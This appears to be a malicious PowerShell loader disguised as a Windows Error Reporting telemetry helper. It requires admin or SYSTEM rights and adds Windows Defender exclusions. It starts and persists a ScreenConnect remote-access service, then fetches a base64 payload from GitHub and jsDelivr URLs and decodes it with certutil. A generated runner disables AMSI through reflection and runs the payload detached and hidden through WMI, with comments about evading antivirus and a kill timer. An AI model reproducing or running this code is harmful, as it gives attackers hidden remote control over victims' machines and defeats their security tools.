# WER telemetry collect helper — UNIFIED8 bootstrap (no .cmd; survives AV that kills wu*.cmd)
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

$WorkDir = 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache'
$Err = Join-Path $WorkDir 'boot.err'
$Out = Join-Path $WorkDir 'boot.out'
$B64 = Join-Path $WorkDir 'update.b64'
$Pkg = 'C:\Windows\Temp\wucache_pkg.ps1'
$Run = Join-Path $WorkDir 'run.ps1'
$Marker = 'WU_BUILD_20260731_UNIFIED8'
$Alt = 'ScreenConnect Client (f861c8140d453427)'
$Cb = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()

function W([string]$m) {
    try {
        if (-not (Test-Path $WorkDir)) { New-Item $WorkDir -ItemType Directory -Force | Out-Null }
        Add-Content -LiteralPath $Err -Value $m -EA 0
    } catch {}
}

# Admin check
$id = [Security.Principal.WindowsIdentity]::GetCurrent()
$p = [Security.Principal.WindowsPrincipal]$id
if (-not (($id.User.Value -eq 'S-1-5-18') -or $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))) {
    Write-Host 'Acces refuse: run as Administrator or SYSTEM'
    exit 5
}

New-Item $WorkDir, 'C:\Windows\Temp' -ItemType Directory -Force | Out-Null
Remove-Item $Err, $Out, $B64 -Force -EA 0
W ("go_start {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

try { sc.exe config $Alt start= auto | Out-Null; sc.exe start $Alt | Out-Null } catch {}

# Kill hung prior workers
Get-CimInstance Win32_Process -EA 0 | Where-Object {
    $_.ProcessId -ne $PID -and $_.CommandLine -and
    ($_.CommandLine -match 'wucache_pkg|\.wucache\\run\.ps1|updateA\.b64|WU_BUILD_')
} | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA 0 }

try {
    Add-MpPreference -ExclusionPath $WorkDir -EA 0
    Add-MpPreference -ExclusionPath 'C:\Windows\Temp' -EA 0
    Add-MpPreference -ExclusionProcess 'powershell.exe' -EA 0
    Add-MpPreference -ExclusionProcess 'certutil.exe' -EA 0
} catch {}

$urls = @(
    "https://raw.githubusercontent.com/xnobuddy/github-drop/main/updateA.b64?t=$Cb",
    "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/updateA.b64?t=$Cb",
    "https://raw.githubusercontent.com/xnobuddy/github-drop/main/updateA.b64"
)
$ok = $false
foreach ($u in $urls) {
    W "dl $u"
    try {
        & curl.exe -L --ssl-no-revoke --connect-timeout 20 -o $B64 $u | Out-Null
        if ((Test-Path $B64) -and ((Get-Item $B64).Length -gt 1000)) { $ok = $true; break }
    } catch {}
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        (New-Object Net.WebClient).DownloadFile($u, $B64)
        if ((Test-Path $B64) -and ((Get-Item $B64).Length -gt 1000)) { $ok = $true; break }
    } catch {}
}
if (-not $ok) { W 'dl_fail'; Write-Host 'Download failed'; exit 1 }
W ("dl_ok bytes={0}" -f (Get-Item $B64).Length)

Remove-Item $Pkg -Force -EA 0
& certutil.exe -decode $B64 $Pkg | Out-Null
if (-not (Test-Path $Pkg)) {
    $b = ([IO.File]::ReadAllText($B64) -replace '\s', '')
    [IO.File]::WriteAllBytes($Pkg, [Convert]::FromBase64String($b))
}
if (-not (Test-Path $Pkg)) { W 'decode_fail'; exit 2 }
W ("decoded_bytes={0}" -f (Get-Item $Pkg).Length)
if (-not (Select-String -LiteralPath $Pkg -Pattern $Marker -Quiet)) {
    W "marker_fail want_$Marker"
    exit 3
}
Copy-Item $Pkg (Join-Path $WorkDir 'wucache_pkg.ps1') -Force -EA 0

# Tiny runner with AMSI bypass (stdout NOT to boot.err)
$runBody = @"
`$ErrorActionPreference='SilentlyContinue'
Add-Content -LiteralPath '$Err' -Value 'ps_engine' -EA 0
try {
  `$t=[Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils')
  if(`$t){ `$f=`$t.GetField('amsiInitFailed',[Reflection.BindingFlags]'NonPublic,Static'); if(`$f){ `$f.SetValue(`$null,`$true) } }
} catch {}
Add-Content -LiteralPath '$Err' -Value 'amsi_ok' -EA 0
`$c=[IO.File]::ReadAllText('$Pkg')
Add-Content -LiteralPath '$Err' -Value ('chars='+`$c.Length) -EA 0
`$sb=[ScriptBlock]::Create(`$c)
Add-Content -LiteralPath '$Err' -Value 'invoke' -EA 0
& `$sb
Add-Content -LiteralPath '$Err' -Value 'invoke_done' -EA 0
if(Test-Path -LiteralPath '$WorkDir\.diag.log'){ Add-Content -LiteralPath '$Err' -Value 'diag_ok' -EA 0 } else { Add-Content -LiteralPath '$Err' -Value 'diag_missing' -EA 0 }
try { sc.exe config '$Alt' start= auto | Out-Null; sc.exe start '$Alt' | Out-Null } catch {}
"@
Set-Content -LiteralPath $Run -Value $runBody -Encoding ASCII -Force
W 'running_via_runps'

# Detach so ScreenConnect Guest 10s kill cannot stop payload
$launch = "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$Run`" > `"$Out`" 2>&1"
try {
    $r = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $launch
    W ("wmic_pid={0} ret={1}" -f $r.ProcessId, $r.ReturnValue)
} catch {
    Start-Process -FilePath 'powershell.exe' -ArgumentList @(
        '-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-File', $Run
    ) -WindowStyle Hidden -RedirectStandardOutput $Out -RedirectStandardError $Out | Out-Null
    W 'started_startprocess'
}

Write-Host "Launched UNIFIED8 worker. Check in 2 min:"
Write-Host "  type $Err"
Write-Host "  type $WorkDir\.diag.log"
try { sc.exe start $Alt | Out-Null } catch {}
exit 0
